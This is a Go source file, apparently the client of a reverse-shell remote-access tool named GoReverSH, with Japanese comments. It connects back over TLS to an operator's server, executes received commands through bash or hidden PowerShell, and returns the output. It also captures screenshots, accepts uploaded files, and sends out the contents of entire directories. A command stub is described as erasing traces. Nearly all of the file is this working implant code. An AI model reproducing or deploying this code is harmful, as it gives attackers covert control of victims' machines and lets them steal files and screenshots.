package main

import (
	"GoReverSH/config"
	"GoReverSH/pkgclient"
	"GoReverSH/utils"

	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"log"
	"math/big"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type Option struct {
	LHOST string
	RHOST string
}

//4桁のIDを作成
func genNumStr(len int) string {
	var container string
	var str = "1234567890"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0; i < len; i++ {
		randomInt, _ := rand.Int(rand.Reader, bigInt)
		container += string(str[randomInt.Int64()])
	}
	return container
}

func padString(source string, toLength int) string {
	currLength := len(source)
	remLength := toLength - currLength

	for i := 0; i < remLength; i++ {
		source += ":"
	}
	return source
}

func runShell(conn net.Conn) error {
	defer conn.Close()

	//receiver のパターンと同じにする
	for {
		cmdBuff := make([]byte, 1024)
		n, err := conn.Read(cmdBuff)
		if err != nil {
			if errors.Is(err, io.EOF) {
				log.Println("disconnect")
				return err
			}
			log.Println(err)
			return err
		}

		commands := strings.Split(string(cmdBuff[:n]), " ")

		//コマンドの引数の数もチェックすること
		switch commands[0] {
		case "cd":
			dir := commands[len(commands)-1]
			os.Chdir(string(dir))

		case "upload":
			//upload
			filePath := strings.Split(commands[len(commands)-1], "/")
			lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
			//dir := "upload/"
			dir := config.Config.UploadDIr
			if _, err := os.Stat(dir + lastPathFromRecievedFile); os.IsNotExist(err) {
				if err2 := os.MkdirAll(dir+lastPathFromRecievedFile, 0755); err2 != nil {
					log.Fatalf("Could not create the path %s", dir)
				}
			}
			fileName := commands[len(commands)-1]
			fmt.Println(fileName)
			//read
			//最終的な入れ物
			var content []byte
			//読み込むもの
			buf := make([]byte, 1024)
			//読み込む位置
			size := 0

			for {
				//ファイルを読み込む
				n, err := conn.Read(buf)
				if err != nil {
					if n == 0 || err == io.EOF {
						break
					}
					log.Println(err)
					break
				}
				//content + bufの中身を一時的に保存。
				tmp := make([]byte, 0, size+n)
				tmp = append(content[:size], buf[:n]...)
				content = tmp
				size += n
				if n < 1024 {
					break
				}
			}

			//save
			src := filepath.Join(dir, fileName)
			file, err := os.Create(src)
			if err != nil {
				log.Println(err)
				break
			}
			base64ToData, err := base64.StdEncoding.DecodeString(string(content))
			_, err = file.Write(base64ToData)
			if err != nil {
				file.Close()
				log.Println(err)
				break
			}
			err = file.Close()
			if err != nil {
				log.Println(err)
				break
			}
			fmt.Println("content save")

		case "screenshot": //ex: screenshot
			//スクリーンショットを撮影し送信
			outdir := config.Config.ScreenshotDir
			filenames, err := pkgclient.Getscreenshot(outdir)
			if err != nil {
				continue
			}

			pkgclient.SendFile(filenames, conn)

			fmt.Println("screenshot finished")

		case "download": //ex: download [path]
			//ファイルシステム構築
			rootPath := commands[len(commands)-1]
			fsys := os.DirFS(rootPath)
			err := fs.WalkDir(fsys, ".", func(path string, d fs.DirEntry, err error) error {
				if err != nil {
					log.Println(err)
					return errors.New("failed filepath.Walk: " + err.Error())
				}
				if d.IsDir() {
					log.Println(1)

					return nil
				}

				f, err := os.Open(rootPath + "/" + path)
				if err != nil {
					log.Println(err)

					return err
				}

				fstats, err := f.Stat()
				if err != nil {
					log.Println(err)

					return err
				}

				var content []byte
				buff := make([]byte, 1024)
				size := 0

				for {
					n, err := f.Read(buff)
					if err != nil {
						if n == 0 || errors.Is(err, io.EOF) {
							break
						}
						log.Println(err)
						break
					}
					//content + bufの中身を一時的に保存。
					tmp := make([]byte, 0, size+n)
					tmp = append(content[:size], buff[:n]...)
					content = tmp
					size += n
					if n < 1024 {
						break
					}
				}

				imageToBase64 := base64.StdEncoding.EncodeToString(content)
				fileinfo := utils.FileInfo{Name: "download/" + rootPath + "/" + path, Body: []byte(imageToBase64), Size: fstats.Size()}

				output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}

				err = json.NewEncoder(conn).Encode(output)
				if err != nil {
					return nil
				}

				f.Close()

				return nil
			})
			if err != nil {
				log.Println(err)
			}

		case "clean_sh": //痕跡消去 ex: clean_go_reversh
			//tips/main11.goを参考
			fmt.Println("CLEAN")

			//clean flagをつけて、正常終了
			//その後、コマンドでファイルを全消去する
			//sleep 5 && rm .

			os.Exit(0)

		default:
			var cmd *exec.Cmd
			//mac linux or windows
			if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
				cmd = exec.Command("/bin/bash", "-c", string(cmdBuff[:n]))
			} else if runtime.GOOS == "windows" {
				cmd = exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "hidden", "-NoLogo", string(cmdBuff[:n]))
			}
			out, err := cmd.Output()
			if err != nil {
				log.Println(err)
				//return
			}

			output := utils.Output{Type: utils.MESSAGE, Message: out}
			err = json.NewEncoder(conn).Encode(output)
			if err != nil {
				log.Println(err)
				return err
			}
		}
	}

}

func main() {
	config.InitConfig()
	fmt.Println(config.Config)

	certFile, keyFile, err := utils.GenClientCerts()
	if err != nil {
		log.Fatalln(err)
	}
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		log.Fatalf("Loadkeys : %s", err)
	}
	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	//config := &tls.Config{InsecureSkipVerify: true}

	server := flag.String("server", "", "target ipaddr")
	port := flag.String("port", "8000", "port")
	flag.Parse()

	var conn net.Conn = nil

	for {
		var err error
		//time.Sleep(1 * time.Second)

		if conn == nil {
			//fmt.Println(*server, *port)
			conn, err = tls.Dial("tcp", net.JoinHostPort(*server, *port), tlsConfig)
			if err != nil {
				//log.Fatalf("Client dial error: %s", err)
				log.Println(err)
				conn = nil
				continue

			}
			defer fmt.Println("Cleanup")
			defer conn.Close()

			//クライアント名を作成
			//hostName, _ := os.Hostname() //develop
			hostName := "" //debug
			id := genNumStr(4)
			clientName := hostName + id
			//送信
			_, err = conn.Write([]byte(clientName))
			if err != nil {
				fmt.Println("Retry")
				conn = nil
				continue
			}

			//shell
			err = runShell(conn)
			if err != nil {
				fmt.Println("Retry")
				conn = nil
				continue
			}
		}
	}
}
